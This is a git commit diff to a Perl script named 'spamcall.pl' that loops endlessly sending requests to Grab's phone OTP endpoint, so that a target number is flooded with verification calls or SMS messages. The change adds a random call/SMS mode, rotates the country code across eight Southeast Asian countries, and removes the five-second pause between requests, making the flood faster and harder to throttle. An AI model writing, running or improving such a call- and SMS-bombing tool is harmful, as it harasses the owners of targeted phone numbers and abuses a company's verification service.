f933ecf1b6f958b48f83614d3a036b979fe5be00
sctnightcore <nightcoremax@gmail.com>
2019-02-06 17:31:27 +0700

    add argv random / random countryCode

--- spamcall.pl
+++ spamcall.pl
@@ -6,17 +6,32 @@ use LWP::UserAgent;
 &main($ARGV[0],$ARGV[1]);
 sub main {
 	my $num_args = $#ARGV + 1;
+	my $go;
 	if ($num_args != 2) {
 		print "By sctnightcore\n";
-		print "Usage: spamcall.pl number CALL|SMS\n";
+		print "Usage: spamcall.pl number CALL|SMS|RANDOM\n";
 		exit;
 	}
+	if ($ARGV[1] eq 'CALL' ) {
+		$go = 'CALL';
+	}
+	
+	if ($ARGV[1] eq 'SMS' ) {
+		$go = 'SMS';
+	}
+	
+	if ($ARGV[1] eq 'RANDOM' ) {
+		my @index = ('CALL','SMS');
+		$go = $index[rand @index]; 
+	}
+	
 	while (1) {
-		my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",Content => 'method='.$ARGV[1].'&countryCode=TH&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4');
+		my @countries = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM');
+		my $ccode = $countries[rand @countries];
+		my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",Content => 'method='.$go.'&countryCode='.$ccode.'&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4');
 		if ( $res->is_success ) {
-			print "Received header:".$res->code."\n";
+			print "[ ".$res->code." ] ".$go." Requested \n";
 		}
-		sleep(5);
 	}
 }
 
